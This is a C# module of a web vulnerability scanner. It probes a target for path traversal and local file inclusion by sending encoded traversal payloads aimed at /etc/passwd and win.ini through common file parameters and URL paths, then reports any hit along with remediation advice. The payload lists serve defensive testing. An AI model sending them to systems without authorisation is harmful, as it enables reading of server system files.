using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using Raqeeb.Domain.Entities;
using Raqeeb.Domain.Interfaces;
using Raqeeb.Domain.Scanning;

namespace Raqeeb.Infrastructure.Scanning.Modules;

/// <summary>
/// Detects path traversal / local file inclusion vulnerabilities.
/// </summary>
public class DirectoryTraversalScanner : IScannerModule
{
    public string Name => "DirectoryTraversalScanner";
    public string Description => "Detects path traversal and local file inclusion (LFI) vulnerabilities.";

    private static readonly List<string> FileParameters =
    [
        "file", "path", "page", "include", "template", "dir",
        "document", "folder", "root", "pg", "style", "lang"
    ];

    private static readonly List<(string Payload, string ExpectedContent, string Os)> Payloads =
    [
        ("../../../etc/passwd", "root:", "Linux"),
        ("....//....//....//etc/passwd", "root:", "Linux"),
        ("..%2f..%2f..%2fetc%2fpasswd", "root:", "Linux"),
        ("..%252f..%252f..%252fetc%252fpasswd", "root:", "Linux"),
        ("/etc/passwd", "root:", "Linux"),
        ("..\\..\\..\\windows\\win.ini", "[fonts]", "Windows"),
        ("....\\\\....\\\\....\\\\windows\\\\win.ini", "[fonts]", "Windows"),
        ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "Windows"),
        ("..\\..\\..\\..\\..\\..\\etc\\passwd", "root:", "Linux"),
        ("..%00/etc/passwd", "root:", "Linux"),  // Null-byte bypass
    ];

    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        var vulnerabilities = new List<Vulnerability>();

        try
        {
            var paramVulns = await TestParametersAsync(context);
            vulnerabilities.AddRange(paramVulns);

            var pathVulns = await TestPathTraversalInPathAsync(context);
            vulnerabilities.AddRange(pathVulns);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Directory Traversal Scanner error: {ex.Message}");
        }

        return vulnerabilities;
    }

    private async Task<List<Vulnerability>> TestParametersAsync(ScanContext context)
    {
        var vulnerabilities = new List<Vulnerability>();
        var baseUrl = context.Target.Url;

        foreach (var param in FileParameters.Take(6))
        {
            foreach (var (payload, expectedContent, os) in Payloads.Take(5))
            {
                try
                {
                    var separator = baseUrl.Contains('?') ? "&" : "?";
                    var testUrl = $"{baseUrl}{separator}{param}={HttpUtility.UrlEncode(payload)}";

                    var response = await context.HttpClient.GetAsync(testUrl);
                    var content = await response.Content.ReadAsStringAsync();

                    if (content.Contains(expectedContent, StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new Vulnerability
                        {
                            Name = "Path Traversal / Local File Inclusion",
                            Description = $"The application is vulnerable to path traversal allowing access to {os} system files. An attacker can read arbitrary files from the server.",
                            Severity = Severity.Critical,
                            Evidence = $"Parameter: {param}\nPayload: {payload}\nExpected content found: {expectedContent}",
                            Remediation = "Validate and sanitize file paths. Use allowlists for permitted files. Avoid passing user input directly to file system APIs. Use chroot jails or containerization.",
                            Url = testUrl,
                            OwaspCategory = "A01:2021 - Broken Access Control",
                            CweId = "CWE-22",
                            CvssScore = "9.1"
                        });
                        return vulnerabilities; // Critical finding, one is enough
                    }
                }
                catch
                {
                    // Continue testing
                }
            }
        }

        return vulnerabilities;
    }

    private async Task<List<Vulnerability>> TestPathTraversalInPathAsync(ScanContext context)
    {
        var vulnerabilities = new List<Vulnerability>();

        try
        {
            var uri = new Uri(context.Target.Url);
            var basePath = $"{uri.Scheme}://{uri.Authority}";

            var pathPayloads = new[]
            {
                "/..%2f..%2f..%2fetc%2fpasswd",
                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "/static/..%252f..%252f..%252fetc/passwd"
            };

            foreach (var payload in pathPayloads)
            {
                try
                {
                    var response = await context.HttpClient.GetAsync(basePath + payload);
                    var content = await response.Content.ReadAsStringAsync();

                    if (content.Contains("root:", StringComparison.OrdinalIgnoreCase))
                    {
                        vulnerabilities.Add(new Vulnerability
                        {
                            Name = "Path Traversal via URL Path",
                            Description = "The web server is vulnerable to path traversal attacks through URL path manipulation, allowing access to system files.",
                            Severity = Severity.Critical,
                            Evidence = $"Payload: {payload}\nSystem file content detected in response",
                            Remediation = "Configure web server to reject path traversal sequences. Update web server to the latest version.",
                            Url = basePath + payload,
                            OwaspCategory = "A01:2021 - Broken Access Control",
                            CweId = "CWE-22",
                            CvssScore = "9.1"
                        });
                        return vulnerabilities;
                    }
                }
                catch
                {
                    // Continue
                }
            }
        }
        catch
        {
            // Continue
        }

        return vulnerabilities;
    }
}
